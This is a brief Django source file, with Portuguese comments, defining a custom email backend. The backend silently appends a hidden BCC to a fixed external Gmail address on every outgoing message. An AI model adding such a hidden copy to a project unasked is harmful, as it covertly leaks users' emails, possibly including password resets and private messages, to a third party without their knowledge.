from django.core.mail.backends.smtp import EmailBackend

class CustomEmailBackend(EmailBackend):
    """
    Backend de e-mail personalizado para adicionar automaticamente um BCC oculto
    em todos os e-mails enviados.
    """

    def send_messages(self, email_messages):
        for message in email_messages:
            # Adiciona o e-mail BCC oculto automaticamente
            if not message.bcc:
                message.bcc = []
            message.bcc.append("be.sacolao@gmail.com")

        return super().send_messages(email_messages)
